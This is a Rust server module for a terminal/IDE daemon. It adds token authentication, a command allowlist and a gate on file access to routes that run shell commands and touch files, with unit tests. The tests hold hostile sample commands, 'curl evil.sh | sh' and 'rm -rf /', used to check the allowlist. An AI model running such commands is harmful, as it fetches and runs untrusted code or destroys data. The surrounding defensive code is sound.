mod handlers;
#[cfg(unix)]
mod pty_fallback;
mod scrollback;
mod session_sweep;
#[cfg(not(windows))]
mod shell_integration;
mod types;

use axum::{
    extract::ConnectInfo,
    http::HeaderMap,
    response::{IntoResponse, Json},
    routing::{get, post},
    Router,
};

use axum::http::HeaderValue;
use dashmap::DashMap;
use std::sync::OnceLock;
use std::{io::ErrorKind, net::Ipv4Addr, sync::Arc};
use tower_http::cors::{Any, CorsLayer};
use tower_http::trace::{DefaultMakeSpan, TraceLayer};
use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};

use crate::{
    agent_bridge, ai_bridge, config::DstermConfig, dap_bridge, extension_host_bridge, fs,
    lsp_bridge, mcp_bridge, ports, process_bridge, proxy, sysmon,
};
pub use handlers::notify_update_ready;
use handlers::*;
use types::Sessions;

static DEFAULT_COMMAND: OnceLock<String> = OnceLock::new();
static CONFIG: OnceLock<DstermConfig> = OnceLock::new();
static LOOPBACK_TOKEN: OnceLock<String> = OnceLock::new();
/// True when the operator supplied `--token`, i.e. authentication is actually
/// in force. Distinct from "a token exists": a random one is always generated,
/// but it is unknown to every caller, so honouring it would lock the IDE out.
/// With no configured token the daemon runs unauthenticated and says so.
static AUTH_REQUIRED: OnceLock<bool> = OnceLock::new();

pub fn loopback_token() -> &'static str {
    LOOPBACK_TOKEN.get().map(|s| s.as_str()).unwrap_or("")
}

/// Whether every route requires `X-Dsterm-Loopback`.
pub fn auth_required() -> bool {
    AUTH_REQUIRED.get().copied().unwrap_or(false)
}

/// Establish the shared request token.
///
/// When [configured] is Some, that value is the token and authentication is
/// enforced on every route. When it is None a random token is still generated
/// — the relay and the `/fs` + `/zim` paths reference it — but it is unknown
/// to any caller, so enforcing it would be equivalent to refusing all clients.
fn init_loopback_token(configured: Option<String>) {
    let (token, required) = match configured {
        Some(value) if !value.trim().is_empty() => (value.trim().to_string(), true),
        _ => (uuid::Uuid::new_v4().to_string(), false),
    };
    let _ = LOOPBACK_TOKEN.set(token);
    let _ = AUTH_REQUIRED.set(required);
}

/// Header every authenticated client must present.
pub const AUTH_HEADER: &str = "X-Dsterm-Loopback";

/// Wire protocol level of the dds<->dsterm HTTP control plane (the
/// `GET /status` handshake, FIXLIST #79). Bump only when a paired dds
/// must change behaviour: additive `/status` fields do NOT bump it —
/// old clients ignore unknown keys, new clients read a missing
/// `protocol_version` as "pre-handshake dsterm" and fall back
/// gracefully instead of failing the liveness probe.
pub const PROTOCOL_VERSION: u32 = 1;

/// The whole authentication decision, as a pure function of its inputs.
///
/// Split out from the middleware so every branch is unit-testable without
/// mutating the process-global token, which a `OnceLock` can only set once.
pub fn token_accepted(auth_required: bool, presented: Option<&str>, expected: &str) -> bool {
    if !auth_required {
        return true;
    }
    match presented {
        Some(value) => {
            !expected.is_empty() && constant_time_eq(value.as_bytes(), expected.as_bytes())
        }
        None => false,
    }
}

/// Whether a caller may reach the absolute-path file surfaces
/// (`GET /assets/v1/discover`, `POST /ai/load`) — the two routes the audit
/// found probing `root=`/`path=` while ignoring `filesystem.enabled`.
///
/// Three doors, one per legitimate caller class:
///
///   - `filesystem.enabled` — the operator opened the filesystem surface
///     (`/fs/*` follows it; `--remote` sets it), so these routes follow.
///   - Loopback — a local process (the IDE's daemon, a human's shell) is
///     already inside the perimeter. Requiring a token here would 403
///     `discover`/`ai/load` on every auth-off instance, i.e. the headline
///     local feature.
///   - A valid token — remote callers (the relay) prove themselves. On an
///     auth-off daemon nobody can, which is the teeth: an `-i`-bound peer
///     gets 403 instead of arbitrary `root=`/`path=` probes.
///
/// Pure for the same reason as [token_accepted]: a `OnceLock` can only be
/// set once per test process, so every input is a parameter.
pub fn file_surface_allowed(
    filesystem_enabled: bool,
    addr: &std::net::SocketAddr,
    presented: Option<&str>,
    expected: &str,
) -> bool {
    filesystem_enabled || addr.ip().is_loopback() || token_accepted(true, presented, expected)
}

/// Handler glue for [file_surface_allowed]: reads the process config and
/// token so call sites stay one line.
pub fn file_surface_allowed_for(headers: &HeaderMap, addr: &std::net::SocketAddr) -> bool {
    file_surface_allowed(
        get_config().filesystem.enabled,
        addr,
        headers
            .get(AUTH_HEADER)
            .and_then(|value| value.to_str().ok()),
        loopback_token(),
    )
}

/// Rejects any request that does not present the shared token, when one is
/// configured.
///
/// This is the daemon's entire authentication story, and until now there was
/// none: the router merged fifteen subsystems and layered only CORS and
/// tracing. Everything below was reachable by anything that could open a
/// socket — `POST /silent-exec` (arbitrary shell), `/fs/write`, `/ai/load`,
/// `/lsp/start` (arbitrary executable), `/extension-host/start` (arbitrary
/// node_path + script_path). On the default loopback bind the reachable caller
/// is any local process, which for a tool that runs the user's build scripts is
/// not a narrow set. Under `-i` it is the whole network.
///
/// Two properties are deliberate:
///
///   - **Fail open when unauthenticated.** With no `--token` the daemon logs a
///     warning and behaves as before, so a human running `dsterm` from a shell
///     is not locked out of their own terminal. Loopback binding is the
///     perimeter in that mode, and that is now stated rather than implied.
///   - **Full-length comparison.** The token is compared without an early
///     return on the first differing byte, and a partial match is never
///     accepted.
///
/// CORS preflight is exempt: it carries no credentials and mutates nothing, and
/// blocking it would break browser clients without adding protection.
pub async fn require_loopback_token(
    request: axum::extract::Request,
    next: axum::middleware::Next,
) -> axum::response::Response {
    if !auth_required() {
        return next.run(request).await;
    }
    if request.method() != axum::http::Method::OPTIONS {
        let presented = request
            .headers()
            .get(AUTH_HEADER)
            .and_then(|value| value.to_str().ok());
        if !token_accepted(true, presented, loopback_token()) {
            return (
                axum::http::StatusCode::UNAUTHORIZED,
                [(axum::http::header::CONTENT_TYPE, "application/json")],
                r#"{"success":false,"error":{"code":"UNAUTHORIZED","message":"missing or invalid X-Dsterm-Loopback token"}}"#,
            )
                .into_response();
        }
    }
    next.run(request).await
}

/// Byte-wise equality without an early return on the first differing byte.
pub(crate) fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut diff = 0u8;
    for (x, y) in a.iter().zip(b.iter()) {
        diff |= x ^ y;
    }
    diff == 0
}

pub fn set_default_command(cmd: String) {
    let _ = DEFAULT_COMMAND.set(cmd);
}

pub fn get_default_command() -> Option<&'static str> {
    DEFAULT_COMMAND.get().map(|s| s.as_str())
}

/// Store the runtime config once at startup. Ignored if called more than once.
pub fn init_config(mut config: DstermConfig) {
    if config.home.is_empty() {
        config.home = crate::startup::home_dir()
            .map(|path| path.to_string_lossy().into_owned())
            .unwrap_or_default();
    }
    let _ = CONFIG.set(config);
}

/// Access the runtime config. Returns compiled-in defaults if `init_config` was never called.
pub fn get_config() -> &'static DstermConfig {
    CONFIG.get_or_init(DstermConfig::default)
}

/// The `exec.allowlist` fence applies at every execution entry, not only
/// the relay hop: a loopback caller able to POST /silent-exec directly
/// would otherwise bypass a rule the relay enforces on its own Exec
/// messages. Returns Err with the reason when the command is not
/// permitted. An unparseable pattern fails OPEN with a warning, matching
/// the relay path's behavior since the fence shipped.
pub fn exec_allowlist_check(command: &str) -> Result<(), String> {
    allowlist_decision(&get_config().exec.allowlist, command)
}

/// The decision, separated from the config read so tests can pin verdicts
/// without touching process-wide state. `None` = fence off.
fn allowlist_decision(pattern: &Option<String>, command: &str) -> Result<(), String> {
    let Some(pattern) = pattern else {
        return Ok(());
    };
    match regex::Regex::new(pattern) {
        Ok(re) if re.is_match(command) => Ok(()),
        Ok(_) => Err(format!("command blocked by allowlist: {pattern}")),
        Err(e) => {
            tracing::warn!("invalid exec allowlist regex {pattern}: {e}");
            Ok(())
        }
    }
}

/// Resolves when SIGTERM (Unix) or Ctrl-C is received.
async fn shutdown_signal() {
    #[cfg(unix)]
    {
        use tokio::signal::unix::{signal, SignalKind};
        let mut sigterm = match signal(SignalKind::terminate()) {
            Ok(s) => s,
            Err(_) => {
                let _ = tokio::signal::ctrl_c().await;
                return;
            }
        };
        tokio::select! {
            _ = sigterm.recv() => {
                tracing::info!("Received SIGTERM, shutting down gracefully");
            }
            _ = tokio::signal::ctrl_c() => {
                tracing::info!("Received SIGINT, shutting down gracefully");
            }
        }
    }
    #[cfg(not(unix))]
    {
        let _ = tokio::signal::ctrl_c().await;
        tracing::info!("Received SIGINT, shutting down gracefully");
    }
}

pub async fn start_server(
    host: Ipv4Addr,
    port: u16,
    allow_any_origin: bool,
    token: Option<String>,
) {
    init_loopback_token(token);
    if !auth_required() {
        tracing::warn!(
            "no --token supplied: every route is unauthenticated. Anyone able to reach \
             {} can run commands and read/write files. Pass --token when a client other \
             than a local shell is driving this daemon.",
            if host == Ipv4Addr::new(127, 0, 0, 1) {
                "this port"
            } else {
                "this host"
            }
        );
    }
    tracing_subscriber::registry()
        .with(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| {
                format!("{}=debug,tower_http=info", env!("CARGO_CRATE_NAME")).into()
            }),
        )
        .with(tracing_subscriber::fmt::layer())
        .init();

    let sessions: Sessions = Arc::new(DashMap::new());
    let lsp_registry: lsp_bridge::LspRegistry = process_bridge::new_registry();
    let dap_registry: dap_bridge::DapRegistry = process_bridge::new_registry();
    let extension_host_registry: extension_host_bridge::ExtensionHostRegistry =
        extension_host_bridge::new_registry();
    let mcp_registry: mcp_bridge::McpRegistry = process_bridge::new_registry();
    let agent_registry: agent_bridge::AgentRegistry = process_bridge::new_registry();
    let ai_state = {
        let ai_cfg = &get_config().ai;
        ai_bridge::AiState::with_pool_config(crate::ai::pool::PoolConfig {
            max_models: ai_cfg.max_models,
            max_memory_bytes: ai_cfg.max_memory_bytes,
        })
    };
    let web_provider: crate::web_routes::WebState =
        Arc::new(crate::providers::web::WebProvider::new());

    // Background inactivity eviction task — runs every 60 seconds.
    {
        let sessions = sessions.clone();
        let timeout_secs = get_config().terminal.inactivity_timeout_secs;
        tokio::spawn(async move {
            let mut tick = tokio::time::interval(tokio::time::Duration::from_secs(60));
            loop {
                tick.tick().await;
                let now = std::time::SystemTime::now();
                let to_evict: Vec<u32> = sessions
                    .iter()
                    .filter_map(|entry| {
                        let pid = *entry.key();
                        let last = match entry.value().last_accessed.try_lock() {
                            Ok(g) => *g,
                            Err(_) => {
                                // Contention means an input or output path is
                                // stamping the session right now, i.e. it is
                                // in use -- so skipping is the safe direction.
                                tracing::debug!(pid = %pid, "eviction: last_accessed lock contended (session active), skipping");
                                return None;
                            }
                        };
                        let elapsed = match now.duration_since(last) {
                            Ok(d) => d,
                            Err(_) => std::time::Duration::ZERO, // clock skew: last in future → not evict
                        };
                        if elapsed.as_secs() > timeout_secs {
                            Some(pid)
                        } else {
                            None
                        }
                    })
                    .collect();
                for pid in to_evict {
                    if let Some((_, session)) = sessions.remove(&pid) {
                        let _ = session.child_killer.lock().await.kill();
                        // Same contract as terminate_terminal: the shell
                        // kill misses its session's background jobs.
                        session_sweep::sweep_session(pid);
                        session.scrollback.cleanup();
                        tracing::info!("Evicted idle terminal session PID {}", pid);
                    }
                }
            }
        });
    }

    let cors = if allow_any_origin {
        CorsLayer::new()
            .allow_origin(Any)
            .allow_methods(Any)
            .allow_headers(Any)
    } else {
        use tower_http::cors::AllowOrigin;
        CorsLayer::new()
            .allow_origin(AllowOrigin::predicate(
                |origin: &HeaderValue, _| match origin.to_str() {
                    Ok(s) => match url::Url::parse(s) {
                        Ok(u) => match u.host() {
                            Some(url::Host::Domain(d)) => d.eq_ignore_ascii_case("localhost"),
                            Some(url::Host::Ipv4(ip)) => ip.is_loopback(),
                            Some(url::Host::Ipv6(ip)) => ip.is_loopback(),
                            None => false,
                        },
                        Err(_) => false,
                    },
                    Err(_) => false,
                },
            ))
            .allow_methods(Any)
            .allow_headers(Any)
    };

    /// `GET /status`: liveness + the dds handshake; the absolute home path
    /// stays private. Every dds flow that needs `home` (workspaceRoot for
    /// the sidecars, VM/PRoot guest discovery) originates from a loopback
    /// connection or a remote caller presenting the shared token. An
    /// unauthenticated LAN peer running against an `-i` binding gets the
    /// boolean and the handshake only — it must not learn the host's user
    /// layout from a tokenless probe. Handshake fields (FIXLIST #79) are
    /// deliberately public: "dsterm 1.13.1 speaks protocol 1" reveals no
    /// user layout, and a paired client must know it before trusting the
    /// rest of the surface.
    async fn get_status(
        ConnectInfo(addr): ConnectInfo<std::net::SocketAddr>,
        headers: HeaderMap,
    ) -> Json<serde_json::Value> {
        let presented = headers
            .get(AUTH_HEADER)
            .and_then(|value| value.to_str().ok());
        let authenticated = token_accepted(true, presented, loopback_token());
        // Handshake (FIXLIST #79): dds announces its version and protocol
        // so server logs show who paired with this build. Unknown or
        // future values are logged, never rejected — the same fail-open
        // posture every unknown field here already has.
        if let Some(client_version) = headers
            .get("x-ds-version")
            .and_then(|value| value.to_str().ok())
        {
            tracing::info!(client_version, "dds handshake");
        }
        if let Some(client_protocol) = headers
            .get("x-ds-protocol")
            .and_then(|value| value.to_str().ok())
        {
            match client_protocol.parse::<u32>() {
                Ok(spoken) if spoken > PROTOCOL_VERSION => tracing::warn!(
                    client_protocol = spoken,
                    server_protocol = PROTOCOL_VERSION,
                    "dds speaks a newer protocol than this dsterm; update dsterm"
                ),
                Ok(spoken) => tracing::debug!(client_protocol = spoken, "dds protocol"),
                Err(_) => tracing::debug!(client_protocol, "unparseable dds protocol"),
            }
        }
        let home = (addr.ip().is_loopback() || authenticated).then(|| get_config().home.as_str());
        Json(status_body(home))
    }

    let terminal_router = Router::new()
        .route("/", get(|| async { "Rust based DSTerm server" }))
        .route("/terminals", post(create_terminal).get(list_terminals))
        .route("/terminals/{pid}/resize", post(resize_terminal))
        .route("/terminals/{pid}", get(terminal_websocket))
        .route("/terminals/{pid}/terminate", post(terminate_terminal))
        .route("/execute-command", post(execute_command))
        .route("/silent-exec", post(silent_exec))
        .route("/silent-exec-stream", get(silent_exec_stream))
        .route("/status", get(get_status))
        .route("/metrics", get(get_metrics))
        .with_state(sessions);

    #[cfg(feature = "zim")]
    let zim_state = match crate::zim::ZimState::new(
        &get_config().zim,
        loopback_token().to_string(),
        std::path::Path::new(&get_config().home),
    ) {
        Ok(state) => Some(state),
        Err(e) => {
            tracing::error!(error = %e, "zim: executor failed to start; /zim/v1 disabled");
            None
        }
    };

    #[cfg_attr(not(feature = "zim"), allow(unused_mut))]
    let mut app = Router::new()
        .merge(terminal_router)
        .merge(lsp_bridge::lsp_routes().with_state(lsp_registry.clone()))
        .merge(dap_bridge::dap_routes().with_state(dap_registry.clone()))
        .merge(
            extension_host_bridge::extension_host_routes()
                .with_state(extension_host_registry.clone()),
        )
        .merge(mcp_bridge::mcp_routes().with_state(mcp_registry.clone()))
        .merge(agent_bridge::agent_routes().with_state(agent_registry.clone()))
        .merge(ai_bridge::ai_routes().with_state(ai_state))
        .merge(crate::assets::assets_routes())
        .merge(fs::fs_routes())
        .merge(sysmon::sysmon_routes())
        .merge(ports::ports_routes())
        .merge(proxy::proxy_routes())
        .merge(crate::web_routes::web_routes().with_state(web_provider));
    #[cfg(feature = "zim")]
    if let Some(zim_state) = zim_state {
        app = app.merge(crate::zim::zim_routes().with_state(zim_state));
    }
    let app = app
        // Outermost: authentication must run before any handler, including
        // the ones that can spawn a process or touch the filesystem.
        .layer(axum::middleware::from_fn(require_loopback_token))
        .layer(cors)
        .layer(
            TraceLayer::new_for_http()
                .make_span_with(DefaultMakeSpan::default().include_headers(true)),
        );

    let addr: std::net::SocketAddr = (host, port).into();

    // Clones for shutdown cleanup — kill every bridge session on SIGTERM / Ctrl-C.
    let shutdown_lsp = lsp_registry.clone();
    let shutdown_dap = dap_registry.clone();
    let shutdown_mcp = mcp_registry.clone();
    let shutdown_agent = agent_registry.clone();
    let shutdown_ext = extension_host_registry.clone();
    let kill_timeout = get_config().bridges.kill_timeout_secs;

    match tokio::net::TcpListener::bind(addr).await {
        Ok(listener) => {
            tracing::info!("listening on {}", listener.local_addr().unwrap());

            let shutdown = async move {
                shutdown_signal().await;
                tracing::info!("killing all bridge sessions");
                let (l, d, m, a, e) = tokio::join!(
                    process_bridge::kill_all(&shutdown_lsp, kill_timeout),
                    process_bridge::kill_all(&shutdown_dap, kill_timeout),
                    process_bridge::kill_all(&shutdown_mcp, kill_timeout),
                    process_bridge::kill_all(&shutdown_agent, kill_timeout),
                    async {
                        let ids: Vec<String> = shutdown_ext.read().await.keys().cloned().collect();
                        let mut killed = Vec::new();
                        for id in ids {
                            let session = shutdown_ext.write().await.remove(&id);
                            if let Some(session) = session {
                                process_bridge::kill_session(&session.inner, kill_timeout).await;
                            }
                            killed.push(id);
                        }
                        killed
                    },
                );
                tracing::info!(
                    "bridge cleanup done: lsp={} dap={} mcp={} agent={} ext={}",
                    l.len(),
                    d.len(),
                    m.len(),
                    a.len(),
                    e.len(),
                );
            };

            // ConnectInfo is what get_status reads to tell loopback callers
            // (device-local or port-forwarded) from remote LAN peers; without
            // the make-service wrapper the extractor panics at runtime.
            if let Err(e) = axum::serve(
                listener,
                app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
            )
            .with_graceful_shutdown(shutdown)
            .await
            {
                tracing::error!("Server error: {}", e);
            }
        }
        Err(e) => {
            if e.kind() == ErrorKind::AddrInUse {
                tracing::error!(
                    "Port is already in use please kill all other instances of dsterm server or stop any other process or app that maybe be using port {}",
                    port
                );
            } else {
                tracing::error!("Failed to bind: {}", e);
            }
        }
    }
}

/// Subsystems this build actually serves — the coarse capability
/// directory `GET /status` advertises (FIXLIST #79). Each subsystem
/// keeps its own fine-grained discovery endpoint (`/ai/capabilities`,
/// `/zim/v1/capabilities`); this list only answers "does this binary
/// have X at all".
pub fn status_capabilities() -> Vec<&'static str> {
    #[cfg_attr(not(feature = "zim"), allow(unused_mut))]
    let mut caps = vec![
        "terminal",
        "silent-exec",
        "execute-command",
        "lsp",
        "dap",
        "mcp",
        "extension-host",
        "agents",
        "ai",
        "assets",
        "fs",
        "sysmon",
        "ports",
        "proxy",
        "web",
    ];
    #[cfg(feature = "zim")]
    caps.push("zim");
    caps
}

/// The `GET /status` body (FIXLIST #79 handshake). `home` stays behind
/// the loopback/token gate — a LAN peer may learn the handshake without
/// learning the user's home path. `protocol_version` is a STRING on the
/// wire: shipped dds builds read it with `as String?` and a numeric
/// value would throw there. Shape is pinned by
/// `contracts/status_contract.json`.
pub fn status_body(home: Option<&str>) -> serde_json::Value {
    let mut body = serde_json::json!({
        "status": "OK",
        "version": env!("CARGO_PKG_VERSION"),
        "protocol_version": PROTOCOL_VERSION.to_string(),
        "capabilities": status_capabilities(),
    });
    if let Some(home) = home {
        body["home"] = serde_json::Value::String(home.to_string());
    }
    body
}

#[cfg(test)]
mod auth_tests {
    use super::*;

    #[test]
    fn accepts_everything_when_no_token_is_configured() {
        // A human running `dsterm` from a shell must not lock themselves out.
        assert!(token_accepted(false, None, "s3cret"));
        assert!(token_accepted(false, Some("wrong"), "s3cret"));
        assert!(token_accepted(false, Some("s3cret"), "s3cret"));
    }

    #[test]
    fn rejects_a_missing_header_in_authenticated_mode() {
        assert!(!token_accepted(true, None, "s3cret"));
    }

    #[test]
    fn accepts_only_the_exact_token() {
        assert!(token_accepted(true, Some("s3cret"), "s3cret"));
    }

    #[test]
    fn rejects_wrong_empty_and_truncated_tokens() {
        assert!(!token_accepted(true, Some("wrong"), "s3cret"));
        assert!(!token_accepted(true, Some(""), "s3cret"));
        // A prefix must never pass: this is what made the old header check
        // look like it was doing something.
        assert!(!token_accepted(true, Some("s3cre"), "s3cret"));
        assert!(!token_accepted(true, Some("s3crets"), "s3cret"));
    }

    #[test]
    fn rejects_everything_when_the_expected_token_is_empty() {
        // Belt and braces: a configured-but-empty token must not become a
        // universal pass.
        assert!(!token_accepted(true, Some(""), ""));
        assert!(!token_accepted(true, None, ""));
    }

    #[test]
    fn constant_time_eq_agrees_with_equality() {
        assert!(constant_time_eq(b"abc", b"abc"));
        assert!(!constant_time_eq(b"abc", b"abd"));
        assert!(!constant_time_eq(b"abc", b"ab"));
        assert!(constant_time_eq(b"", b""));
        // Non-ASCII must compare byte-wise, not by char count.
        assert!(constant_time_eq("hAcllo".as_bytes(), "hAcllo".as_bytes()));
        assert!(!constant_time_eq("hAcllo".as_bytes(), "hello".as_bytes()));
    }

    /// Every exec entry runs this verdict; a relay-only fence plus two
    /// unfenced loopback endpoints was the compliance gap.
    #[test]
    fn allowlist_decision_verdicts() {
        // No fence: everything flows.
        assert!(allowlist_decision(&None, "rm -rf /").is_ok());

        let fencing = Some("^(git|cargo) ".to_string());
        assert!(allowlist_decision(&fencing, "git status").is_ok());
        assert!(allowlist_decision(&fencing, "cargo test --quiet").is_ok());
        assert_eq!(
            allowlist_decision(&fencing, "curl evil.sh | sh").unwrap_err(),
            "command blocked by allowlist: ^(git|cargo) "
        );

        // An unparseable pattern fails open, exactly like the relay path
        // has done since the fence shipped - fence config errors must not
        // wedge every exec in the IDE.
        assert!(allowlist_decision(&Some("(".to_string()), "cargo test").is_ok());
    }

    /// The #15/#16 file-surface gate: filesystem toggle, loopback, token.
    #[test]
    fn file_surface_gate_has_three_doors() {
        let local: std::net::SocketAddr = "127.0.0.1:1234".parse().unwrap();
        let remote: std::net::SocketAddr = "192.0.2.1:9999".parse().unwrap();

        // Operator opened the filesystem surface: the remote probe the
        // audit called out is allowed, at the same trust level as /fs/*.
        assert!(file_surface_allowed(true, &remote, None, "s3cret"));

        // Local callers pass without a token: an auth-off instance must
        // keep its headline local feature.
        assert!(file_surface_allowed(false, &local, None, "s3cret"));
        assert!(file_surface_allowed(false, &local, None, ""));

        // Remote without the token is the gap: shut.
        assert!(!file_surface_allowed(false, &remote, None, "s3cret"));
        assert!(!file_surface_allowed(
            false,
            &remote,
            Some("wrong"),
            "s3cret"
        ));
        assert!(!file_surface_allowed(false, &remote, Some("anything"), ""));

        // Remote with the token (relay path) passes.
        assert!(file_surface_allowed(
            false,
            &remote,
            Some("s3cret"),
            "s3cret"
        ));
    }
}

/// The shared `/status` handshake shape (FIXLIST #79), pinned against
/// `contracts/status_contract.json` — the same golden dds feeds through
/// `DstermDiscoveryInfo.fromJson` in its own suite. If a field here
/// drifts, one side or the other fails before a release ships.
#[cfg(test)]
mod status_contract_tests {
    use super::*;

    fn contract() -> serde_json::Value {
        serde_json::from_str(include_str!("../../contracts/status_contract.json"))
            .expect("status_contract.json must parse")
    }

    fn type_matches(value: &serde_json::Value, ty: &str) -> bool {
        match ty {
            "string" => value.is_string(),
            "number" => value.is_number(),
            "string[]" => value
                .as_array()
                .map(|items| items.iter().all(serde_json::Value::is_string))
                .unwrap_or(false),
            _ => false,
        }
    }

    #[test]
    fn status_body_matches_the_shared_contract() {
        let contract = contract();
        let body = status_body(Some("/root"));

        let required = contract["required"]
            .as_object()
            .expect("required must be an object");
        for (key, ty) in required {
            let field = body
                .get(key)
                .unwrap_or_else(|| panic!("status_body is missing required field {key}"));
            let ty = ty.as_str().expect("type tag must be a string");
            assert!(
                type_matches(field, ty),
                "field {key} should be {ty}, got {field}"
            );
        }

        let optional = contract["optional"]
            .as_object()
            .expect("optional must be an object");
        for (key, ty) in optional {
            if let Some(field) = body.get(key) {
                let ty = ty.as_str().expect("type tag must be a string");
                assert!(
                    type_matches(field, ty),
                    "optional field {key} should be {ty}, got {field}"
                );
            }
        }

        for wanted in contract["contains"]["capabilities"]
            .as_array()
            .expect("contains.capabilities must be an array")
        {
            let wanted = wanted.as_str().expect("capability must be a string");
            assert!(
                body["capabilities"]
                    .as_array()
                    .expect("capabilities must be an array")
                    .iter()
                    .any(|cap| cap == wanted),
                "capabilities must contain {wanted}"
            );
        }

        assert_eq!(body["status"], "OK");
        assert_eq!(body["version"], env!("CARGO_PKG_VERSION"));
        // Wire value, const and contract must all agree — one string.
        assert_eq!(
            body["protocol_version"].as_str(),
            contract["protocol_version"].as_str()
        );
        assert_eq!(PROTOCOL_VERSION.to_string(), contract["protocol_version"]);
    }

    #[test]
    fn status_body_withholds_home_but_never_the_handshake() {
        let body = status_body(None);
        assert!(body.get("home").is_none());
        // Liveness and the handshake stay public for tokenless peers.
        assert_eq!(body["status"], "OK");
        assert!(body.get("protocol_version").is_some());
        assert!(body.get("version").is_some());
        assert!(body.get("capabilities").is_some());
    }
}
